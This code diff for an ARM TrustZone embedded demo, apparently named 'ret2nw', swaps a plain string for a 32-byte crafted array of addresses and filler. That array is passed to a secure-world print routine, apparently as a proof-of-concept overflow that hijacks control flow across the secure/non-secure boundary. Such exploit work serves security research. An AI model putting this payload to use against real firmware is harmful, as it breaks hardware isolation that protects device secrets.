@@ -8,9 +8,8 @@
 #include "ret2nw_ns.h"
 #include "trustzone_veneer.h"
 
-char user_input[] = "AAAA Hello World (ns)\r\n";
-
 void print_in_s_handler(char* content);
+void func_up_ns(void);
 
 void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
 {
@@ -26,7 +25,6 @@ void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
 		svc_args = (unsigned *) stack_frame_addr;}
 	else {// additional state context present (only for Secure SVC)
 		svc_args = (unsigned *) (stack_frame_addr+40);}
-	// stack contains: r0, r1, r2, r3, r12, r14, the return address and xPSR
 	// extracts SVC number
 	svc_number = ((char *) svc_args[6])[-2]; // Memory[(stacked_pc)-2]
 	stacked_r0 = (char *) svc_args[0];
@@ -65,6 +63,24 @@ void print_in_s_ns(char* user_str)
 
 void ret2nw_ns()
 {
+	char user_input[32] = {\
+		0x20,0x20,0x20,0x20,\
+		0xc0,0x05,0x00,0x20,\
+		0x6f,0x01,0x00,0x00,\
+		0x22,0x22,0x22,0x22,\
+		0x23,0x23,0x23,0x23,\
+		0x24,0x24,0x24,0x24,\
+		0x52,0x83,0x00,0x00,\
+		0x25,0x25,0x25,0x25};
 	DROP_NS_PRIVILEGES;
 	print_in_s_ns(user_input);
+	func_up_ns();
+}
+
+void func_up_ns()
+{
+	while(1)
+	{
+		
+	}
 }
